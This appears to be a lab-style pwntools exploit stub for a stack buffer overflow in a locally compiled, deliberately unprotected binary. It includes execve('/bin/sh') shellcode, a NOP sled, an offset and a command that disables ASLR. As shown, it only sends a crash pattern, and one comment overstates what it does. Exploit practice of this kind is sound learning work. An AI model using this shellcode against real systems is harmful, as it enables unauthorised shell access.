#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Compile target: gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c
binary = './vuln'

# Simple execve("/bin/sh") shellcode
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# Offset: 72 for a 64-byte buffer
offset = 72
nop_sled = b"\x90" * (offset - len(shellcode))

# Calculate buffer address dynamically using an info leak or stack alignment
# For testing: disable ASLR first
# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Use a JMP RSP gadget if available, or calculate the stack address
# Let's use a technique: overwrite with a ret2shellcode using NOP sled
# We'll guess the buffer address is near RSP at crash time

# Another approach: ret2libc (bypass NX) - but NX is disabled here via -z execstack

# Let's just use a simple return-to-buffer approach
# Run this script, it will try to find the right offset and address

p = process(binary, ['AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV'])
print(p.readall())
p.close()

print("[*] Run with GDB to find the exact buffer address:")
print("[*] gdb -q ./vuln")
print("[*] run AAAA...")
print("[*] x/gx $rsp")
